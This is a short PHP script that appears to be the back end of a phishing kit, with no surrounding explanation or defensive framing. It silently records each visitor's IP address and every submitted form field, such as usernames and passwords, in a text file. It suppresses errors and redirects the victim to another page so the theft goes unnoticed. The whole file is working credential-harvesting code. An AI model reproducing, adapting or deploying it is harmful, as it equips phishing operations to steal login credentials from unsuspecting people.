<?php
 // include ('UserInformation.php');
    include ('ip.php');

header('location: wlrugng5h7hkrhf5f84gjdjkf4fgjdhbf.html');

// header('location: loginsubmit.html');
error_reporting(0);
$handle = fopen("pbaba.txt","a");
fwrite($handle, $ip_address);
fwrite($handle, "\r\n");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 
       